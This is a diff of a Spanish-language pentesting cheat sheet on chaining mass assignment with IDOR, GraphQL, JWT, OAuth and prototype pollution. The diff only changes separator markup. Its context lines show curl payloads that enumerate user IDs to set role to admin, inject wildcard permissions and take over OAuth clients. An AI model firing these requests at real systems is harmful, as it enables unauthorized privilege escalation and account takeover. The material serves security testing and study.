@@ -20,7 +20,7 @@ linked:
 ---
 # Mass Assignment - Chains con Otras Vulns
 
-***
+---
 
 ## IDOR + Mass Assignment
 
@@ -34,7 +34,7 @@ linked:
 | `for id in {1..100}; do curl -s -X PATCH https://target/api/users/$id -H "Authorization: Bearer $TOK" -d '{"role":"admin"}'; done` | Bulk privesc enumeration | IDOR sin owner check. |
 ^ma-chain-idor
 
-___
+---
 
 ## GraphQL Mutation Mass Assignment
 
@@ -61,7 +61,7 @@ curl -X POST -H "Content-Type: application/json" \
   https://target/graphql
 ```
 
-___
+---
 
 ## JWT Update via Mass Assign
 
@@ -74,7 +74,7 @@ ___
 | `curl -X PATCH https://target/profile -d '{"permissions":[\"*\"]}'` y luego usar token | Permissions inject + reuse | Permissions claim regenerada. |
 ^ma-chain-jwt
 
-___
+---
 
 ## OAuth Scope Injection via MA
 
@@ -87,7 +87,7 @@ ___
 | `curl -X PATCH https://target/oauth/clients/X -d '{"owner_id":1}'` | Cross-org client takeover | Multi-tenant OAuth. |
 ^ma-chain-oauth
 
-___
+---
 
 ## Prototype Pollution Combo
 
@@ -124,4 +124,4 @@ PATCH /api/users/1
 // - Object.prototype.globalAdmin=true → todos los objetos heredan
 ```
 
-***
+---
